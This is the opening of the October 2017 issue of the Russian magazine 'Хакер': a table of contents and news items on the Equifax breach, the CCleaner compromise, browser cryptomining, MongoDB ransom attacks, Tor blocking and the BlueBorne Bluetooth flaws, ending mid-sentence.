             №224
                                          ОКТЯБРЬ
                                                     2017

ДОСТУП
РАЗРЕШЕН
Изучаем баги, позволяющие
                                               Coverснять данные с зашифрованных         Story
Android-смартфонов





Защищаемся             Проворачиваем           Разбираемся,
от произвола          сложную MITM-атаку          как работает
пограничников              в Wi-Fi -сети               Linux изнутри
                                                      октябрь 2017
            № 224
CONTENT

    MEGANEWS
  Всё новое за последний месяц

    Дос туп раз решен
  Изучаем баги LG, Samsung и Motorola, позволяющие снять данные с зашифрованного
  смар тфо на

     Кунг‐фу для маковода
  Изучаем уникальные утилиты командной строки macOS

    Страдания с ReactOS
  Почему в заменителе Windows работают трояны, но не работает Word

   WWW
  Интересные веб‐сервисы

    Дай джест Android
  Взлом приложений для Android и iOS и инструмен ты для мобиль ного пентестера

     Android 8 изнутри
  Безопас ность и огра ничения

     Android 1 глазами юзера Android 8
  Какой была пер вая версия самой популярной ОС и как она менялась со вре менем

    Вопрос доверия
  Как iOS 11 защитит тебя от про изво ла полиции и пограничников

    При готовь ся к инъ екции
  Раскру чиваем уязвимости в WordPress, препарировав метод prepare

    Алмазный фонд «Хакера»
  Самые кру тые материалы по ревер сингу и malware за три года

     Течь в Apache
  Разбираем баг Optionsbleed, который угрожает безопасности веб‐сер вера

    Злой роутинг
  Провора чиваем хитроум ную MITM‐ата ку в Wi‐Fi‐сети

     Игра в чис ла
  Разбираем уязвимость Integer Overﬂow в веб‐сер вере nginx

     X‐Tools: Vulners edition
  Ищем спло иты на Python, ска ним уязвимые серверы и автоматизируем пентест

    Жизнь без антивируса
  Как побороть мал варь голыми руками и обезопасить себя на будущее

    Windows 10 про тив шиф ровальщиков
  Как устроена защита в обновленной Windows 10

    Феномен целевых атак
  Колонка Дениса Макрушина

      Fall Creators Update для программиста
  Пробуем новые фичи Universal Windows Platform

    Де зинфицируем Android
  Как устроены прог раммы для очистки смар тфо на от встроенной малвари

    Как работает Linux
  От нажатия кнопки включения до рабочего стола

    Бе зопасность пре выше все го
  9 трюков, которые сделают твою жизнь секьюрнее

    Сисадминский must have
  12 утилит, о которых дол жен знать каждый админ

    Защита для вир туалки
  Гэрри Оуэн о том, как VMware изменит под ход к корпоративной безопасности

     Титры
  Кто дела ет этот журнал

                                       Мария «Mifrill» Нефёдова
                                                    nefedova@glc.ru





КРАХ EQUIFAX
В начале сентября 2017 года стало извес тно об утеч ке дан ных, которую
допустило одно из круп нейших бюро кредитных исто рий в мире Equifax.
  Представите ли североамериканского подразде ления Equifax сооб щили,
что неизвес тные зло умыш ленники завладели личной информацией 143 мил‐
лионов человек (все го в США про живает 324 мил лиона человек), включая их
номера соци ального стра хования и водительских удостоверений, пол ные
име на и адреса. Кро ме того, в 209 тысячах случаев в документах также
фигурирова ла информация о банковских картах клиентов. Хотя отде ления
Equifax в других странах не пос тра дали, утечка так же затронула некоторое
количество жителей Канады и Великобритании.
  Сообщалось, что неизвес тные про никли на серверы компании еще в
мае 2017 года, но их при сутствие оста валось незаме ченным вплоть до конца
июля 2017 года.
  После столь резонансно го взло ма ИБ‐эксперты и СМИ немедленно при‐
нялись строить пред положения о том, как именно злоумышленники могли
ском про метировать одно из крупнейших бюро кредитных историй. Наибо лее
интерес ную и «складную» теорию выдвинули представители пор тала QZ.com,
при надлежаще го Atlantic Media. Они писали, что хакеры могли исполь зовать
критическую уязвимость в Apache Struts (CVE‐2017‐9805), об обнаруже нии
которой официально сообщили в начале сентября 2017 года, хотя баг при‐
сутствовал в коде девять лет.
  В результате разработчики Apache Software Foundation вынуждены были
выступить с офи циальным заявлением и попытались оправдаться. В офи‐
циальном блоге появилось длинное послание, написанное вице‐президен‐
том Apache Struts, где тот под черки вал, что доказательств исполь зования
бага CVE‐2017‐9805 пока нет. Также он акцентировал внимание на том, что
эта проблема была выявлена исследова телями только в июле 2017 года, тог‐
да как взлом Equifax произошел в мае 2017 года. То есть, даже если хакеры
дей ствительно эксплуатировали уяз вимость, на тот момент она еще пред‐
став ляла собой 0day.
  В итоге проведенное расследование показало, что теория QZ.com была
почти верна. 14 сентября 2017 года на официаль ном сай те equifaxsecuri‐
ty2017.com,  пос вященном  инци денту,  появилось  обновле ние,  согласно
которому зло умышленни ки действи тельно скомпрометирова ли компанию
через уязвимость в Apache Struts. Но, как оказалось, преступники эксплуати‐
ровали проблему CVE‐2017‐5638, а вовсе не све жий баг CVE‐2017‐9805.
  Интересно, что уязвимость CVE‐2017‐5638 была устранена еще в начале
марта 2017 года, более того, в силу дос тупнос ти экспло итов проблему прак‐
тически сразу начали активно использовать злоумыш ленни ки. Так как, сог‐
ласно офи циальным дан ным, взлом Equifax произошел в мае, выходило, что
у компании было два месяца на установку обновления, однако по какой‐то
при чине этим никто не оза ботился.
  Впрочем, в конце сентября, благода ря пуб ликации изда ния Wall Street
Journal, появились подозрения, что взлом Equifax про изошел не в мае. Жур‐
налисты издания ссылаются на информацию, которой с ними поделились
представите ли ком пании FireEye, получившие данные от неназванных кли‐
ентов Equifax. Оказалось, что первые признаки компро метации сети бюро
кредитных историй появились еще в марте 2017 года, а не в мае, как гласили
офи циальные заявления. Тем не менее к тому момен ту о CVE‐2017‐5638 уже
в любом случае было известно.
  Однако проблемы Equifax не ограничились одним только взломом и кра‐
жей колоссальных объемов данных. После того как об инциденте узнала
широкая общественность, компания ста ла объ ектом жесткой критики СМИ
и ИБ‐спе циалистов со всего мира. Дело было даже не в самом взломе, а в
том, как предста вители Equifax спра вились с последстви ями компрометации
и утечкой данных.
  К при меру, после публикации официального заявления об инциденте
для пос традав ших был запущен специальный сайт equifaxsecurity2017.com,
где можно найти отве ты на наиболее рас простра ненные вопросы, подать
заяв ление на исполь зование бесплатного кре дит ного мониторинга, а также
вос поль зовать ся сервисами по защите от кражи личности. При этом кли‐
ентам ком пании предоставили возможность проверить, числятся ли их дан‐
ные в списках пострадавших, но сде лать это нужно уже на дру гом сайте:
trustedidpremier.com/eligibility.
  Жур налисты издания Vice Motherboard раскри тиковали компанию за соз‐
дание путани цы из трех разных сай тов (ведь еще есть официальный equifax.‐
com). Более того, предста вители издания обнаружили, что защита от кра жи
личности TrustedID Premier работа ет весьма стран но. В час тнос ти, система
попросила некоторых сотрудников редакции вернуть ся для активации Truste‐
dID Premier через неделю. Другим журналистам система сообщила, что их
данные не пострадали, но после повторного запроса их тоже попросили вер‐
нуть ся поз же.
   Хуже того, представители СМИ выяс нили, что сайт для пострадавших
работа ет под управлением стоковой вер сии WordPress, которую вряд ли мож‐
но наз вать безопасной и подходящей для такого слу чая.
  Позднее и вовсе ста ло известно, что пред ставители Equifax по ошибке
нап равляли сво их клиентов не на официальный сайт для пострадавших, а на
под дельную страницу. Так, в офи циальном твиттере представите ли бюро кре‐
дитных исто рий неоднократно совето вали пос традав шим посетить сайт secu‐
rityequifax2017.com вместо  настоящего  equifaxsecurity2017.com. Подделку
зарегистрировал ИБ‐исследователь, который хотел продемонс трировать,
нас колько легко будет перепутать офи циаль ную и поддель ную страницы. Ему
это опре деленно удалось. В настоящее время все ошибочные сообщения
уже были удалены, но некото рые из них можно увидеть на иллюстра циях
ниже.





53,5% ЖИТЕЛЕЙ РОССИИ УВЕРЕНЫ, ЧТО ЗА НИМИ МОГУТ
СЛЕДИТЬ ХАКЕРЫ
→Согласно опросу, про веден ному специалистами ком пании Avast, более половины жителей
России уверены, что хакеры могут следить за ними через веб‐камеры на их компьюте рах.

В среднем в мире 2 из 5 рес пондентов (40%) не знают о такой угрозе, в то время как многие
рос сияне уверены, что такая возможность существует. При этом исследователи отмечают, что
угроза действитель но есть, а некото рые из подоб ных шпионских программ и вов се бесплат ны.


Увы, нес мотря на то что практичес ки все знают о такой вероятности, опрос показал, что лишь
34% россиян соблюда ют меры безопас ности.





CCLEANER
ВЗЛОМАЛИ
Спе циалисты Cisco Talos расска зали о неп риятном инциденте, затронув шем
популярное при ложе ние CCleaner, использующееся для оптимизации и «чис‐
тки» ОС семейства Windows. По данным иссле дова телей, неизвес тные зло‐
умыш ленни ки ском про мети ровали при ложение еще 15 августа 2017 года
и вплоть до 12 сен тября 2017 года вместе с CCleaner распростра нялась мал‐
варь Floxif.
  Компро метацию заметили почти случайно: во время изучения офи циаль‐
ной версии CCleaner 5.33 обнаружи лось, что приложение связыва ется
с подозрительным доменом. Как оказалось, ответс твенен за это был вре‐
донос Floxif, работающий лишь на 32‐бит ных системах из‐под учетной записи
адми нистратора.
  Малварь собирает все данные о зараженной машине (информа цию о сис‐
теме, запущенных про цес сах, MAC‐адресах сетевых устрой ств и уни каль ные
ID ком плектующих), а затем переда ет их на уда ленный сервер злоумыш‐
ленников. При этом вредонос способен скачивать и запускать допол нитель‐
ные бинар ники, хотя, по данным иссле дователей, ни один зараженный хост
так и не под вергся второй фазе ата ки, то есть Floxif не загружал допол нитель‐
ные пейлоады на зараженные устрой ства.





                        Схема работы Floxif

Из начально  эксперты  Cisco  Talos  предположили,  что  злоумышленники
каким‐то образом ском промети ровали цепочку поставок Avast и исполь‐
зовали циф ровой сертификат, чтобы подписать вредонос ную версию CClean‐
er 5.33, подменив ею легитимный вариант. Исследователи не исключали, что
преступникам помог инсайдер.
   Разработ чики CCleaner, ком пания Piriform, которую недавно приобрела
Avast, подтвердили случившееся в офи циальном блоге. Они сооб щили, что
зараже нию подвер глись 32‐бит ные вари анты CCleaner 5.33.6162 и CCleaner
Cloud 1.07.3191. По данным раз работчиков, в ходе ата ки пострадали более
двух миллионов пользователей.
   13 сентября 2017 года была выпущена версия CCleaner 5.34, а также
обновле ние 1.07.3214 для CCleaner Cloud, которые не содержат вре донос‐
ного кода.
  Однако к кон цу сентября выяснилось, что данная атака, скорее все го,
была не так проста и велась группой «правительственных хакеров», извес‐
тной под названием Axiom (также группиров ку называ ют APT17, DeputyDog,
Tailgater Team, Hidden Lynx, Voho, Group 72 и AuroraPanda).
  Первым о связи взлома CCleaner с опе рациями Axiom загово рил Костин
Райю  (Costin  Raiu),  гла ва международной  исследовательской команды
«Лаборатории Касперского». В сво ем твиттере эксперт обра тил вни мание
на то, что код малвари, использовавшейся при атаке на CCleaner, очень
похож на исходный код бэк дора Missl, который ранее обнаруживали во время
кампаний Axiom.
  С теорией эксперта согласились и его коллеги из Cisco Talos. Согласно
детальному отче ту о проведенном ими рассле дова нии, «группа 72» вполне
могла стоять за взло мом CCleaner. Скрин шот ниже наглядно демонс трирует
сов падения исходни ков, вызвавшие подозрения у специалистов.


                                     Продолжение статьи →
← Начало статьи





  Кро ме того, аналити ки Cisco Talos заявили, что неназванная третья сторона
  пре дос тавила в их распоряжение файлы с управляюще го сервера зло умыш‐
  ленников, вклю чая БД. Именно на этот сервер пос тупали данные, собранные
  ском про метированными  вер сиями  CCleaner  (информация  о  системе,
  запущенных процессах, MAC‐адресах сетевых устрой ств и уникаль ные ID
  ком плектующих). Спе циалисты  пишут,  что они про вери ли подлинность
  информации, сопоставив ее с дан ными, соб ранны ми с их собственных тес‐
  товых машин. Стоит отме тить, что в рас поряжении экспертов оказались дан‐
  ные только за 12–16 сентября 2017 года (при чем данные за 12 сентября,
  судя по все му, были повреждены).
     Анализ этой информации выявил, что сведения о малвари Floxif, которая
  рас пространялась вместе с CCleaner, оказались неточными. Как выяснилось,
  злоумышленники все‐таки загрузили допол нитель ные пейлоады как минимум
  на двадцать разных хостов. Так, в пери од 12–16 сентября к управляющему
  серверу обращались свы ше 700 тысяч машин, и более двад цати из них под‐
  верглись второй стадии заражения.
    На втором этапе зараже ния зло умышленни ки идентифици ровали под‐
  ходящие для про должения атаки сис темы, на которые в итоге дос тавлял ся
  незатей ливый бэкдор. Он получал IP‐адре са посредством поисковых зап‐
  росов к github.com и wordpress.com, пос ле чего скачивал на устрой ство
  дополнительную малварь.
    Интересно, что ата кующие вычисляли подходящих жертв по доменным
  име нам их компь ютеров. На управляющем сер вере обна ружился длинный
  спи сок, в котором специалисты Cisco наш ли и свою ком панию. Помимо Cis‐
   co, преступников инте ресовали: Singtel, HTC, Samsung, Sony, Gauselmann, In‐
    tel, VMware, O2, Vodafone, Linksys, Epson, MSI, Akamai, D‐Link, Oracle (Dyn),
  а также Microsoft и Google (Gmail). Исследователи уже связались со всеми
  потенциально пос традавшими организациями и предупредили их о воз‐
  можных проблемах.
     ИБ‐спе циалисты сооб щили, что в теории преступники могли добраться
  и до других крупных ком паний и учреждений. Дело в том, что простой SQL‐
  запрос  показал,  что 540 ском прометирован ных  CCleaner компьюте ров
   находят ся в правительственных сетях и еще 51 устройство принадлежит бан‐
   кам.


 ПОЛ МИЛЛИАРДА ПОЛЬ ЗОВАТЕ ЛЕЙ УЖЕ ПОСТРАДАЛИ
  ОТ МАЙ НИН ГА ЧЕРЕЗ БРАУЗЕРЫ
  →Согласно исследова нию, проведенному специалис тами ком пании Adguard, внедрение май‐
   нинговых  скриптов  непосредс твен но  в  код  стра ниц  веб‐сай тов набирает  популярность
   с огромной скоростью. Подобный «приработок» прак тикуют как зло умышленники, так и сами
   администра торы раз личных крупных ресурсов, к примеру операто ры торрент‐тре кера The Pirate
   Bay.

  2,2% сай тов из топовых 100 тысяч ресурсов Alexa майнят крип товалюту пос редс твом браузе‐
   ров посетителей.

   Операторы 220 сайтов встроили майнинговые скрипты прямо на главные страницы своих
   ресурсов.

   Уже более 500 000 000 человек невольно предоставили свои системы для май нин га, прос то
   зай дя на очеред ной сайт.

   Самыми популярными сер висами для браузерного май нин га пока остаются Coinhive и JSEc-
   oin.





 ЗОЛОТАЯ
 КРИПТОЛИХОРАДКА
  В этом месяце опе раторы торрент‐трекера The  Pirate  Bay, сами того
  не желая, дали мощный толчок такому старому‐новому явлению, как майнинг
  через браузе ры. 16 сентября 2017 года поль зователи трекера заметили, что
  при посещении некоторых страниц сайта нагрузка на про цессор резко воз‐
  растает. Как выяснилось, причиной тому стал криптовалютный майнер,
  который встро или прямо в код сай та при помощи обыч ного JavaScript. Опе‐
  рато ры трекера объяснили, что майнер может помочь ресурсу в будущем
  пол ностью избавиться от рекламы.
    При ближайшем рассмот рении оказалось, что май нер был предоставлен
  сервисом Coinhive, который предлага ет владель цам сайтов конвертировать
  мощности CPU посетителей в крип товалюту Monero. При этом майнер
  работал не на всех стра ницах ресурса: фун кцию активировали для резуль‐
   татов поиска и на страницах категорий, на главной странице, а так же на стра‐
  ницах отдельных раздач майнер не функци онировал.
     Хо тя сам принцип вов се не нов, до недавнего вре мени никто не пытался
  массово внедрять скрытые скрип ты для май нинга прямо в код сайтов,
  но теперь, следуя примеру The Pirate Bay, этим занимаются все, кто только
  может, плюс к теме проявля ют большой интерес злоумышленники.
     К  примеру,  жертвами  прес тупни ков,  которые  пытаются  заработать
  на пользовате лях, стали разработчики и 140 тысяч пользовате лей популяр‐
  ного рас ширения для Chrome, SafeBrowse. В коде аддона появил ся вре‐
  доносный JavaScript, который зас тавлял бра узеры пользователей майнить
  крип товалю ту Monero. Странное поведение рас ширения не осталось незаме‐
  ченным, так как нагрузка на CPU значительно возрастала, вплоть до полной
  неработоспособности «зараженного» компьютера.
     Как ока залось, разработчики SafeBrowse вооб ще не внед ряли майнер
   в код своего продукта. Они сообщили жур налистам Bleeping Computer, что
  занимаются рассле дова нием происшедшего и их, по всей видимости, взло‐
  мали. Дело в том, что официально расширение не обновля лось несколько
  месяцев, поэто му откуда взялось вредоносное обновление, содержащее
  майнер, авто ры SafeBrowse были вынуждены выяс нять вместе со спе циалис‐
  тами Google.
     Так как работа май нера значитель но влияет на производительность
  устройства и не заметить про исходящее слож но, май нинговую рекламу ста‐
  рают ся внедрять на сайты с потоковым видео или браузерными играми.
  Такие ресур сы сами по себе заметно наг ружа ют сис тему и потребляют
  ресурсы, так что поль зователь может не заметить работающий на фоне май‐
   нер. Более того, на таких сай тах пользователи про водят много времени, что
   сулит опе рато рам адвари большие прибыли.
     Как уже было ска зано выше, сами по себе майнеры для бра узе ров
  не такое уж новое явление. К примеру, предлага ющий подобные услуги сер‐
  вис Bitp.it появился еще в 2011 году, но в ито ге был закрыт. Также в 2015 году
  генеральная про куратура штата Нью‐Джерси закрыла аналогичный ресурс
   Tidbit, предлагав ший владельцам сайтов май нер, который будет эксплу ати‐
  ровать компьюте ры посети телей. Тог да власти сочли такую деятель ность
  нелегальной, сродни хакингу, ведь Tidbit не уведом лял пользователей о про‐
  исхо дящем и не спрашивал их раз решения.
     Но,  заинтересовавшись  браузерами  пользовате лей,  преступники
  не забыли и о дру гих схемах получения прибыли, связанных с майнингом. Так,
  ана лити ки «Лаборатории Касперского» под счи тали, что количес тво майнин‐
  говой малвари растет угрожающими тем пами. Если за 2013 год ком пания
  зафиксирова ла все го 205 тысяч атак таких вредоносов, то за пер вые восемь
  месяцев 2017 года их количество превысило уже 1,65 мил лиона.
    Иссле дователи IBM X‐Force, в свою оче редь, про анализировали ситу ацию
   в кор поративных сетях. По данным специалистов, количество атак на кор‐
  поратив ные сети с целью май нинга криптовалют возросло в шесть раз
  за период с января по август 2017 года. Теперь злоумышленни ки активно
  при меняют стеганографию, то есть пря чут вредонос ный код в фай лах изоб‐
  ражений, которые затем размещают на заражен ных серверах популярных
  CMS (WordPress, Joomla и JBoss). Для первичной компро метации сер веров
  злоумышленники привлека ют самые раз ные техники, «обширные наборы экс‐
  пло итов» и CMDi (command injection).
    Непос редс твенно для май нинга преступники чаще всего исполь зуют
  легитимный инс трумент Minerd или его Linux‐порт kworker. Также сообщает ся,
   что атакующих инте ресуют вовсе не Bitcoin и Ethereum, а криптовалю ты,
  которые работают с протоколом CryptoNote. В основном злоумышленники
  майнят Monero (XMR), но также их внимание прив лекали Bytecoin (BCN), Bool‐
   berry (BBR), Dashcoin (DSH), DigitalNote (XDN), DarkNetCoin (DNC), Fantomcoin
   (FCN), Pebblecoin (XPB), Quazarcoin (QCN) и Anonymous Electronic On‐line Coin
  (AEON).





  →«Мас штабируемость — это проблема номер один. Сущес твует целое кладбище сис тем,
   которые утвер ждали, буд то решили проблему мас штабиру емос ти, но это оказалось не так.
   Это очень серь езный и тяжелый вызов для нас, таковы общеизвес тные факты»
  — Виталик Бутерин о проблемах масштабирования. Одним из главных решений дан ного воп‐
   роса Бутерин считает шардинг.





 ВЫМОГАТЕЛИ
 АТАКУЮТ MONGODB
  Начиная с декабря 2016 года злоумыш ленники массово ата куют плохо нас‐
  троенные серверы MongoDB. В конце 2016 — начале 2017 года хакеры сти‐
  рали из БД информацию и требовали выкуп за воз вращение данных (которых
   у зло умышленников зачастую попросту не было). Первый инцидент такого
  рода был замечен известным ИБ‐исследова телем и главой GDI Foundation
  Вик тором Гевер сом (Victor Gevers) и выглядел как еди ничный слу чай, но вско‐
  ре стало оче видно, что тактику взяли на воору жение уже десятки хакер ских
   групп.
     Те перь Геверс и его коллега, ИБ‐спе циалист Дилан Кац (Dylan Katz) пре‐
  дупредили, что вымогательские ата ки, пошедшие на спад весной и летом
  текуще го года, возоб новились с новой силой. По данным специалистов,
  на сце не появились сразу три новые хакерские группы, если судить по email‐
  адресам, использованным в вымога тельских сообщениях.
     Хо тя по сравнению с началом года чис ло ата кующих мало, груп пировки
  подош ли к делу с размахом, и их атаки причиня ют едва ли не больший ущерб.
  К примеру, зимой прес тупники сумели ском прометировать 45 тысяч БД
  за месяц активной деятель нос ти, а груп пировка Cru3lty взло мала 22 449 БД
  все го за одну неделю.
     Виктор Геверс, который по‐прежнему наблюдает за ситуацией, сообщил,
   что видел случаи, когда пострадавшие вос ста нав ливали уда ленное злоумыш‐
  ленниками содержимое БД из резервных копий, но в тот же день атакующие
  ломали сер вер повторно и вновь сти рали данные, хотя адми нистра ция сер‐
  вера пыталась обезопасить MongoDB.



         «Теперь нам нужно разобраться в том, что именно происходит, потому
         что для завер шения кар тины нам не хва тает кусоч ков головолом ки.
        Все дело в нехватке зна ний [у админис тра торов]? Они сами ухуд шают
         безопас ность нас тройкой MongoDB, не подоз ревая об этом? Они
         работа ют с уста рев шими вер сиями, не име ющими безопас ных дефол-
         тных зна чений и содер жащими дру гие уяз вимос ти?» — теоре тизи-
         ровал Геверс.

  Как выяснилось, эксперт практически не ошиб ся в своих предположе ниях.
  Дело в том, что разработ чики MongoDB не мог ли оставить новую вол ну атак
  без вни мания. В итоге в бло ге компании появилось сообщение от старшего
  директора по безопасности про дуктов Дави Оттенгеймера (Davi Ottenheimer).
  Он сообщил, что разработ чики оказывают помощь ИБ‐специалистам и тоже
   ста раются разобраться в происходящем. К сожале нию, выводы получи лись
  сов сем неутешительными.
     Разработ чики признали, что проб лемы возникли еще до релиза вер сии
  MongoDB 2.6.0. Дело в том, что дефолтная конфигурация ранних версий
  MongoDB поз воляла кому угодно подключить ся к интерфейсу админис тра‐
   тора, не толь ко через localhost, но хоть отку да. Хуже того, учетная запись
  адми нистратора работа ла без пароля, что и вовсе было настоящим подарком
  для зло умышленни ков. Хотя ком пания быс тро осознала свои ошибки и устра‐
  нила эти проблемы, уяз вимые вер сии уста новок уже разош лись по всему
  интернету, их при меняли хостинг‐про вай деры и такие гиганты, как Amazon.
  В резуль тате тысячи небезопасных серверов MongoDB оказались легкими
  мишенями для преступни ков.
    Однако теперь детальное изу чение проб лемы выявило, что от атак
  вымогателей стра дают отнюдь не толь ко администраторы старых и уязвимых
  версий. Разработчики расска зали, что пользователи самостоятель но саботи‐
  руют защиту своих серверов и игно риру ют даже простей шие правила
  безопасности. В результате их серверы «смот рят» в интернет вооб ще
  без паролей. Разработчики MongoDB и ИБ‐специалисты приш ли к выводу,
   что именно такие уста нов ки и стра дают в ходе новой вымогательской кам‐
   пании.
     Разработ чики в очередной раз напомнили администраторам о необ‐
  ходимос ти своевременного обновления ПО и призвали хотя бы изучить нас‐
  тройки и обе зопасить фай лы конфигура ции БД. Также в своем послании
  Оттенгеймер сообщил, что грядущий релиз 3.5.7 (а так же 3.6.x) принесет
  строгую привязку localhost‐only, которая будет при меняться по умол чанию
  для всех сборок.


 ОКОЛО 1 000 000 ВРЕДОНОС НЫХ ПИСЕМ ПРОПУСКАЕТ
  OFFICE 365 ЗА МЕСЯЦ
  →Ана литики компании Cyren изучили 10,7 мил лиона электрон ных писем, прошедших через
   почтовый сер вис Microsoft Ofﬁce 365. Иссле дователи пояс няют, что встроенный защит ный
   механизм Ofﬁce 365, Exchange Online Protection, в основном полагается на фильтрацию кор‐
   респонденции по репутации, то есть IP‐адрес отправителя дол жен быть внесен сис темой в чер‐
   ный список. К сожалению, во время IoT‐бот нетов и распределен ных атак такая тактика работает
   не слиш ком хорошо.

   Как выяс нилось, 9,3% писем содержали мал варь или были откро венным спамом и фишингом.

  950 тысяч сообщений были написа ны спамерами, 34 тысячи посланий оказались фишин‐
   говыми, а еще 3900 содержали вредонос ное ПО.





                                        Продолжение статьи →
← Начало статьи





 КАК БУДУТ
 БЛОКИРОВАТЬ TOR
  Минув шим летом Владимир Путин подписал закон 29.07.2017 № 276‐ФЗ «О
  вне сении изменений в Федеральный закон „Об информации, информацион‐
  ных тех нологи ях и о защите информации“», который вступил в силу 1 нояб‐
  ря 2017 года. Закон поз волит рос сий ским властям блокировать сай ты и сер‐
   висы, пос редством которых можно получить дос туп к заб локированным в РФ
  ресурсам. Таким образом, «в опале» могут ока заться VPN‐сервисы, ано‐
  нимай зеры, Tor и им подобные.
    Жур налисты «Ведомос тей» поинтересовались у одно го из авторов тех‐
  нологии луковой мар шрутизации, Дэвида Голь дшлага, каким образом Рос‐
  комнадзор смо жет бороться с  Tor. Разработчик рас сказал изданию, что
   регулятор может воспользоваться следующей методикой.
     Когда поль зователь вводит в бра узере адрес сайта, на который желает
   попасть, его зап рос в зашифрованном виде передается на первый, входной
   узел с собственным IP‐адре сом. Для тех, кто не зна ет, как работает Tor, Голь‐
  дшлаг пояснил, что узлы бывают двух типов — публичные и непубличные.
  И рос сий ские пользователи Tor чаще все го под клю чаются к публичным. IP‐
  адреса пуб личных узлов находят ся в открытом дос тупе, так что регулятор
  может внести эти адреса, а также IP‐адре са .onion‐сай тов в реестр зап‐
  рещен ных ресурсов и на уров не провайдеров ограничить дос туп к Tor. Голь‐
  дшлаг под черки вает, что это слож но, но технически выполнимо, прос то про‐
  вай деры должны дей ствовать сообща. При этом спе циалист отказался
  обсуждать с журналистами планы Роскомнадзора отно ситель но Tor.
    По словам Гольдшлага, хороший при мер того, как это делается на наци‐
  ональном уровне, — Китай, но ограничения на уровне провайдеров при меня‐
  ются во мно гих странах, в том числе в США. Раз работчик отметил, что за пос‐
  ледние пять лет количество россий ских пользователей Tor увеличилось в три
  раза (по данным «Ведомос тей», таковых нас читыва ется более 200 тысяч).
     Руководитель общес твенной организа ции «Рос комсвобода» Артем Коз‐
  люк полагает, что для блокировки входных узлов Tor Рос комнад зору впол не
   хватит «закона об анонимай зерах». Про цесс будет запущен (если будет)
  не раньше середи ны декаб ря 2017 года, так как сначала ведомс тво должно
  попросить сер вис не предоставлять доступ к зап рещенным сайтам, выждать
  положенные 30 дней и, если ответа не будет, начать выявлять вход ные узлы.
  Козлюк сом невается, что Рос комнад зор решится заблокировать домен ную
  зону .onion полностью, все же .onion‐сайтов множес тво и их в чис ле прочих
  используют СМИ, научные сооб щества и соци альные сети.


 РОССИЙСКИЕ «ПИРАТЫ» ОТЛИЧНО ПРИСПОСОБИЛИСЬ
  К НОВЫМ УСЛОВИЯМ СУЩЕС ТВОВАНИЯ
  →Эк сперты Group‐IB предста вили исследование, озаглавленное «Эко номи ка пират ских сай‐
   тов — 2016». Специалис ты рас сказали, что, невзирая на широкое при мене ние анти пират ско го
   законодатель ства, торговцы нелегаль ным контентом отработали устой чивые модели капита‐
   лизации бизнеса и сейчас их обороты лишь про должают рас ти.

  Ры нок контрафак тного онлайн‐видео в Рунете в прошлом году вырос более чем в 2 раза, дос‐
   тигнув отметки в 3,3 миллиарда рублей.

   Суммарный доход пиратов Рунета в 2016 году оце нива ется в 4,3 миллиар да рублей.

   Среднестатис тичес кий «пиратский» онлайн‐кинотеатр зарабатывает порядка 9 миллионов
   рублей в год.

  →Круп ней шие нелегаль ные онлайн‐киноте атры 2016 года:

           1. Seasonvar.ru

           Посещаемость: 1 миллион человек в сутки

           Годовой доход: 192,3 миллиона руб лей

            Статус: все еще работает


           2. My-hit.org

           Посещаемость: 397 тысяч человек в сут ки

           Годовой доход: 70 мил лионов рублей

            Статус: все еще работает


           3. HDrezka.me

           Посещаемость: 315 тысяч человек в сут ки

           Годовой доход: 69,4 миллиона руб лей

            Статус: заблокирован по жалобе правообладателей


           4. Kinokrad.co

           Посещаемость: 271 тысяча человек в сут ки

           Годовой доход: 59,7 миллиона руб лей

            Статус: заблокирован по жалобе правообладателей


           5. Baskino.Club

           Посещаемость: 234 тысячи человек в сутки

           Годовой доход: 41 мил лион руб лей

            Статус: заблокирован по жалобе правообладателей



   По данным Роскомнадзора, в 2016 году по антипиратскому законо дательству были заб локиро‐
   ваны 453 интернет‐ресурса, с начала 2017 года — уже 6842.

   По решению Мос горсуда в Рунете навсегда закрыто 600 доменов.





 НОВАЯ ОПАСНОСТЬ
 BLUETOOTH
  Спе циалисты ком пании Armis предуп редили, что 5,3 миллиарда устрой ств,
  работа ющих с различными имплемен тациями Bluetooth в Android, iOS, Win‐
  dows и Linux, уязвимы перед восемью опасными проблемами, которым было
  присвоено общее название BlueBorne. Спе циалис ты заверили, что проблемы
  BlueBorne невоз можно обна ружить и исправить стандартными методами,
  а для экс плуатации багов не потребуется никакого вза имодей ствия с поль‐
  зователем, нужен лишь включенный Bluetooth.
     BlueBorne пред став ляет опасность для самых разных устройств, начиная
   от смартфонов, носимых устройств и ноут буков и заканчивая IoT‐девай сами
  и автомобилями. Все, что так или иначе поддерживает Bluetooth, находится
   в зоне риска.
    В сос тав BlueBorne вошли восемь проб лем, найденные в сте ках крупных
  про изводителей: CVE‐2017‐0781, CVE‐2017‐0782, CVE‐2017‐0783 и CVE‐2017‐
  0785 для Android, CVE‐2017‐1000251 и CVE‐2017‐1000250 для Linux, CVE‐
  2017‐14315 для iOS, CVE‐2017‐8628 для Windows. Баги были обнаруже ны
   в L2CAP, BlueZ, SDP, SMP, BNEP, PAN Proﬁles, а так же проприетарной импле‐
  ментации LEAP, исполь зуемой Apple.
    Опи санные исследователями уязвимости поз воляют выполнить на устрой‐
   стве произволь ный код, устро ить ата ку Man‐in‐the‐Middle и перехватить Blue‐
   tooth‐соединение. Хуже того, специалисты предупредили, что проблемы ока‐
  зались наиболее опасными Bluetooth‐багами за все время иссле дований
  и могут быть исполь зованы для соз дания саморазмножающегося Bluetooth‐
  червя, который в теории способен спро воци ровать эпидемию мирово го мас‐
  штаба.



        «Проблемы, которые обна руживали в Bluetooth ранее, в основном
        сущес твовали на уров не протокола. Эти новые уяз вимос ти работа ют
         на  уров не импле ментации,  что  поз воляет  обойти  ряд защитных
        механиз мов и полностью перехватить контроль над устройством», —
         говорят спе циалис ты Armis.

  Компания уже уведоми ла о проблемах ведущих про изво дителей ПО и железа,
  включая Apple, Google, Microsoft, а также сооб щес тво Linux. В разработке
  сей час находится мно жество патчей, которые должны стать доступными
  для поль зовате лей в ближайшее время. При этом иссле дова тели понимают,
   что  исправления  получат  далеко  не  все  уязвимые  устройства,  так
   как огромный процент таких девайсов уже дав но относится к разряду уста‐
  рев ших и больше не поддержи вается. По мнению аналитиков Armis, патчи
   никогда не вый дут для 40% уязвимых устрой ств, а это свыше двух миллиардов
   уязвимых девайсов с поддержкой Bluetooth.
     Известно, что BlueBorne не представляет опасности для Android‐устрой‐
   ств, исполь зующих Bluetooth Low Energy. Для остальных случаев вышли
  обновле ния, вошед шие в состав сентябрьско го Android Security Bulletin.
    Проблеме подвержены все версии Windows начиная с Vista, разработ‐
   чики Microsoft тоже уже занимаются патчами. Так, в состав сентябрь ского
   «втор ника обновлений» вош ло исправление для CVE‐2017‐8628, соз данное
